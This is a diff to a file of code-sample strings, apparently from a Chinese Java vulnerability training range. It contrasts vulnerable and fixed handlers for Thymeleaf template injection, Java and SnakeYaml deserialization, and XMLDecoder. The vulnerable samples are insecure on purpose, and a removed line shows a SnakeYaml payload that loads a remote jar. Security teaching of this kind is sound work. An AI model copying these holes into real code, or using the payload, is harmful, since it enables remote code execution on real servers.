@@ -2409,15 +2409,17 @@ const spelSafe = "public R safe(String ex) {\n" +
     "}\n"
 
 const sstiVul = "public String vul1(@RequestParam String para, Model model) {\n" +
-    "    // 用户输入直接拼接到模板路径，可能导致SSTI（服务器端模板注入）漏洞\n" +
+    "    // 用户输入直接拼接到模板路径，Thymeleaf 会对视图名中的 __${...}__ 做预处理\n" +
     "    return \"vul/ssti/\" + para;\n" +
     "}\n" +
     "\n" +
-    "public void vul2(@PathVariable String path) {\n" +
+    "public String vul2(@PathVariable String path) {\n" +
+    "    // URL 路径变量直接拼接到模板路径，同样会触发 Thymeleaf 视图名预处理\n" +
     "    log.info(\"SSTI注入：\"+path);\n" +
+    "    return \"vul/ssti/\" + path;\n" +
     "}\n" +
     "\n" +
-    "\t// 缺陷组件版本参考\n" +
+    "// 缺陷组件版本参考\n" +
     "<parent>\n" +
     "    <groupId>org.springframework.boot</groupId>\n" +
     "    <artifactId>spring-boot-starter-parent</artifactId>\n" +
@@ -2434,57 +2436,54 @@ const sstiVul = "public String vul1(@RequestParam String para, Model model) {\n"
 const sstiSafe = "public String safe1(String para, Model model) {\n" +
     "    List<String> white_list = new ArrayList<>(Arrays.asList(\"vul\", \"ssti\"));\n" +
     "    if (white_list.contains(para)){\n" +
-    "        return \"vul/ssti\" + para;\n" +
+    "        return \"vul/ssti/\" + para;\n" +
     "    } else{\n" +
     "        return \"common/401\";\n" +
     "    }\n" +
     "}\n" +
     "@GetMapping(\"/safe2/{path}\")\n" +
-    "public void safe2(@PathVariable String path, HttpServletResponse response) {\n" +
+    "public void safe2(@PathVariable String path, HttpServletResponse response) throws IOException {\n" +
     "    log.info(\"SSTI注入：\"+path);\n" +
+    "    response.setContentType(\"text/plain;charset=UTF-8\");\n" +
+    "    response.getWriter().write(\"已跳过视图解析，输入路径：\" + path);\n" +
     "}"
 
 const vulReadObject = "public R vul(String payload) {\n" +
     "    try {\n" +
-    "        payload = payload.replace(\" \", \"+\");\n" +
-    "        byte[] bytes = Base64.getDecoder().decode(payload);\n" +
-    "        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);\n" +
-    "        java.io.ObjectInputStream in = new java.io.ObjectInputStream(stream);\n" +
-    "        in.readObject();\n" +
-    "        in.close();\n" +
-    "        return R.ok(\"[+]Java反序列化：ObjectInputStream.readObject()\");\n" +
+    "        byte[] bytes = decodePayload(payload);\n" +
+    "        Object obj;\n" +
+    "        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes))) {\n" +
+    "            obj = in.readObject();\n" +
+    "        }\n" +
+    "        return R.ok(\"[+]Java反序列化：\" + obj);\n" +
     "    } catch (Exception e) {\n" +
     "        return R.error(\"[-]请输入正确的Payload！\\n\"+e.getMessage());\n" +
     "    }\n" +
-    "}"
+"}"
 const safeReadObject1 = "public R safe1(String payload) {\n" +
-    "    // 安全措施：禁用不安全的反序列化\n" +
+    "    // 禁用 Commons Collections 不安全反序列化开关\n" +
     "    System.setProperty(\"org.apache.commons.collections.enableUnsafeSerialization\", \"false\");\n" +
     "    try {\n" +
-    "        payload = payload.replace(\" \", \"+\");\n" +
-    "        byte[] bytes = Base64.getDecoder().decode(payload);\n" +
-    "        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);\n" +
-    "        java.io.ObjectInputStream in = new java.io.ObjectInputStream(stream);\n" +
-    "        in.readObject();\n" +
-    "        in.close();\n" +
-    "        return R.ok(\"[+]Java反序列化：ObjectInputStream.readObject()\");\n" +
+    "        byte[] bytes = decodePayload(payload);\n" +
+    "        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes))) {\n" +
+    "            in.readObject();\n" +
+    "        }\n" +
+    "        return R.ok(\"[+]Java反序列化：禁用Commons Collections不安全反序列化开关\");\n" +
     "    } catch (Exception e) {\n" +
     "        return R.error(\"[-]请输入正确的Payload！\\n\"+e.getMessage());\n" +
     "    }\n" +
     "}"
 const safeReadObject2 = "public R safe2(String payload) {\n" +
     "    try {\n" +
-    "        payload = payload.replace(\" \", \"+\");\n" +
-    "        byte[] bytes = Base64.getDecoder().decode(payload);\n" +
-    "        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);\n" +
+    "        byte[] bytes = decodePayload(payload);\n" +
     "        // 创建 ValidatingObjectInputStream 对象\n" +
-    "        ValidatingObjectInputStream ois = new ValidatingObjectInputStream(stream);\n" +
-    "        // 设置拒绝反序列化的类\n" +
-    "        ois.reject(java.lang.Runtime.class);\n" +
-    "        ois.reject(java.lang.ProcessBuilder.class);\n" +
-    "        // 只允许反序列化Sqli类\n" +
-    "        ois.accept(Sqli.class);\n" +
-    "        ois.readObject();\n" +
+    "        try (ValidatingObjectInputStream ois = new ValidatingObjectInputStream(new ByteArrayInputStream(bytes))) {\n" +
+    "            ois.reject(java.lang.Runtime.class);\n" +
+    "            ois.reject(java.lang.ProcessBuilder.class);\n" +
+    "            // 只允许反序列化Sqli类\n" +
+    "            ois.accept(Sqli.class);\n" +
+    "            ois.readObject();\n" +
+    "        }\n" +
     "        return R.ok(\"[+]Java反序列化：ObjectInputStream.readObject()\");\n" +
     "    } catch (Exception e) {\n" +
     "        return R.error(\"[-]请输入正确的Payload！\\n\"+e.getMessage());\n" +
@@ -2493,22 +2492,25 @@ const safeReadObject2 = "public R safe2(String payload) {\n" +
 const safeReadObject3 = "safeReadObject3"
 
 const vulSnakeYaml = "public R vul(String payload) {\n" +
+    "    if (payload == null || payload.trim().isEmpty()) {\n" +
+    "        return R.error(\"Payload不能为空\");\n" +
+    "    }\n" +
     "    Yaml y = new Yaml();\n" +
-    "    y.load(payload);\n" +
-    "    return R.ok(\"[+]Java反序列化：SnakeYaml\");\n" +
+    "    Object result = y.load(payload);\n" +
+    "    return R.ok(\"[+]Java反序列化：SnakeYaml原生漏洞，解析结果：\" + result);\n" +
     "}\n" +
     "\n" +
     "// payload示例\n" +
-    "payload=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:7777/yaml-payload.jar']]]]\n"
+    "payload=!!top.whgojp.modules.sqli.entity.Sqli {id: 1, username: test, password: pass}\n"
 const safeSnakeYaml = "public R safe(String payload) {\n" +
     "    try {\n" +
     "        Yaml y = new Yaml(new SafeConstructor());\n" +
-    "        y.load(payload);\n" +
-    "        return R.ok(\"[+]Java反序列化：SnakeYaml安全构造\");\n" +
+    "        Object result = y.load(payload);\n" +
+    "        return R.ok(\"[+]Java反序列化：SnakeYaml安全构造，解析结果：\" + result);\n" +
     "    } catch (Exception e) {\n" +
-    "        return R.error(\"[-]Java反序列化：SnakeYaml反序列化失败\");\n" +
+    "        return R.error(\"[-]Java反序列化：SnakeYaml反序列化失败：\" + e.getMessage());\n" +
     "    }\n" +
-    "}"
+"}"
 
 const vulXmlDecoder = 'public R vul(String payload) {\n' +
     '    String[] strCmd = payload.split(" ");\n' +
